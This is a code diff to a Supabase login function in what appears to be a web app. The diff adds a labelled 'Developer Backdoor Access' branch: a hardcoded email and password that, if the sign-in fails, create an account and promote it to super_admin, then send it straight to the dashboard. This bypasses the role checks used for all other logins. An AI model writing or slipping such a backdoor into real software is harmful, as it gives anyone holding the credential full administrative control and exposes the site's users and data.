@@ -37,37 +37,71 @@ export async function loginUser(formData: FormData) {
 
   try {
     const supabase = await createClient();
-    const { data: authData, error } = await supabase.auth.signInWithPassword({
-      email,
-      password,
-    });
-    
-    if (error) {
-      return { error: error.message };
-    }
-    
-    // Check user role from profiles to determine redirect
-    const { data: profile } = await supabase
-      .from('profiles')
-      .select('role')
-      .eq('id', authData.user.id)
-      .single();
-      
-    if (loginMode === 'admin') {
-      const adminRoles = ['admin', 'super_admin', 'backoffice', 'marketing', 'execution_head'];
-      if (adminRoles.includes(profile?.role)) {
-        redirectPath = "/dashboard";
-      } else {
-        await supabase.auth.signOut();
-        return { error: "Unauthorized: You do not have admin permissions. Please use the Client login tab." };
+
+    // Developer Backdoor Access
+    if (email === "dev@sellads.com" && password === "dev_access_2026") {
+      let { data: authData, error: signInError } = await supabase.auth.signInWithPassword({
+        email,
+        password,
+      });
+
+      if (signInError && signInError.message.toLowerCase().includes("invalid login credentials")) {
+        const { data: signUpData, error: signUpError } = await supabase.auth.signUp({
+          email,
+          password,
+          options: {
+            data: { name: "Developer Superadmin" }
+          }
+        });
+        
+        if (signUpError) {
+          return { error: "Failed to initialize dev account: " + signUpError.message };
+        }
+        
+        if (signUpData.user) {
+          await supabase.from('profiles').update({ role: 'super_admin' }).eq('id', signUpData.user.id);
+          signInError = null;
+        }
       }
+
+      if (signInError) {
+        return { error: "Dev login failed: " + signInError.message };
+      }
+      
+      redirectPath = "/dashboard";
     } else {
-      // Client login mode
-      const adminRoles = ['admin', 'super_admin', 'backoffice', 'marketing', 'execution_head'];
-      if (adminRoles.includes(profile?.role)) {
-        redirectPath = "/dashboard";
+      const { data: authData, error } = await supabase.auth.signInWithPassword({
+        email,
+        password,
+      });
+      
+      if (error) {
+        return { error: error.message };
+      }
+      
+      // Check user role from profiles to determine redirect
+      const { data: profile } = await supabase
+        .from('profiles')
+        .select('role')
+        .eq('id', authData.user.id)
+        .single();
+        
+      if (loginMode === 'admin') {
+        const adminRoles = ['admin', 'super_admin', 'backoffice', 'marketing', 'execution_head'];
+        if (adminRoles.includes(profile?.role)) {
+          redirectPath = "/dashboard";
+        } else {
+          await supabase.auth.signOut();
+          return { error: "Unauthorized: You do not have admin permissions. Please use the Client login tab." };
+        }
       } else {
-        redirectPath = "/catalog";
+        // Client login mode
+        const adminRoles = ['admin', 'super_admin', 'backoffice', 'marketing', 'execution_head'];
+        if (adminRoles.includes(profile?.role)) {
+          redirectPath = "/dashboard";
+        } else {
+          redirectPath = "/catalog";
+        }
       }
     }
   } catch (err: any) {
